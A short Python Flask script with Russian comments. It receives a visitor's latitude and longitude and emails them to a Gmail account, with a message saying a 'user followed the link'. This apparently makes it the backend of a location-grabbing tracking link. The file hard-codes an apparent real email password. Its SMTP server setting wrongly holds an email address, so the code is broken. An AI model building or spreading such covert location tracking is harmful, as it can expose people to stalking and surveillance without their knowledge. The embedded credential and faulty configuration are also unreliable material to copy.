from flask import Flask, request, jsonify
import smtplib
from email.mime.text import MIMEText

app = Flask(__name__)

# Настройки для SMTP
SMTP_SERVER = "ptaknik@gmail.com"  
SMTP_PORT = 587  # Обычно 587 для TLS
EMAIL = "ptaknik@gmail.com"  # Ваш email
PASSWORD = "IponiasdF1"  # Ваш пароль от почты
TO_EMAIL = "ptaknik@gmail.com"  # Куда отправить письмо (ваш email)

def send_email(latitude, longitude):
    subject = "Координаты пользователя"
    message = f"Пользователь перешел по ссылке. Его координаты:\nШирота: {latitude}\nДолгота: {longitude}"
    
    msg = MIMEText(message)
    msg["Subject"] = subject
    msg["From"] = EMAIL
    msg["To"] = TO_EMAIL

    with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
        server.starttls()
        server.login(EMAIL, PASSWORD)
        server.sendmail(EMAIL, TO_EMAIL, msg.as_string())

@app.route('/send_location', methods=['POST'])
def send_location():
    data = request.get_json()
    latitude = data.get("latitude")
    longitude = data.get("longitude")
    
    if latitude and longitude:
        send_email(latitude, longitude)
        return jsonify({"status": "success", "message": "Location sent via email"}), 200
    else:
        return jsonify({"status": "error", "message": "Invalid data"}), 400

if __name__ == '__main__':
    app.run(debug=True)
  
